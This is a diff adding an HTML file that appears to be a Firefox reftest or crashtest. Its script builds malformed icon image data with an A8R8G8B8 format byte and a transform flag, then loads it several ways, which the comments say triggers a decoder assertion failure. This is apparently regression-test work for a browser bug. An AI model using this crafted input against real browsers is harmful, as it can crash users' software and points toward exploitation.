@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html class="reftest-wait">
+<head><meta charset="utf-8"></head>
+<body>
+<script>
+
+function makeIconData(w, h, format, transform) {
+    var header = new Uint8Array([w, h, format, transform]);
+    var pixels = new Uint8Array(w * h * 4);
+    for (var i = 0; i < pixels.length; i += 4) {
+        pixels[i]   = 0x80;
+        pixels[i+1] = 0xFF;
+        pixels[i+2] = 0x40;
+        pixels[i+3] = 0x80; // semi-transparent alpha triggers premultiply path
+    }
+    var data = new Uint8Array(4 + pixels.length);
+    data.set(header);
+    data.set(pixels, 4);
+    return data;
+}
+
+// Trigger the vulnerability: A8R8G8B8 format with transform flag
+// This causes MOZ_ASSERT failure at SurfacePipeFactory.h:722
+var data = makeIconData(10, 10, 4, 0xFF);
+var blob = new Blob([data], { type: 'image/icon' });
+var url = URL.createObjectURL(blob);
+var img = new Image();
+img.src = url;
+document.body.appendChild(img);
+
+// Also try via data: URI for redundancy
+var data2 = makeIconData(4, 4, 4, 0xFF);
+var b64 = btoa(String.fromCharCode.apply(null, data2));
+var img2 = new Image();
+img2.src = 'data:image/icon;base64,' + b64;
+document.body.appendChild(img2);
+
+// Multiple concurrent loads to increase reliability
+for (var i = 0; i < 10; i++) {
+    var sz = (i % 8) + 2;
+    var d = makeIconData(sz, sz, 4, 0xFF);
+    var b = new Blob([d], { type: 'image/icon' });
+    var u = URL.createObjectURL(b);
+    var im = new Image();
+    im.src = u;
+    document.body.appendChild(im);
+}
+
+async function finish() {
+    await new Promise(resolve => { requestAnimationFrame(resolve); });
+    document.documentElement.removeAttribute('class');
+}
+
+document.addEventListener('MozReftestInvalidate', finish);
+
+</script>
+</body>
+</html>
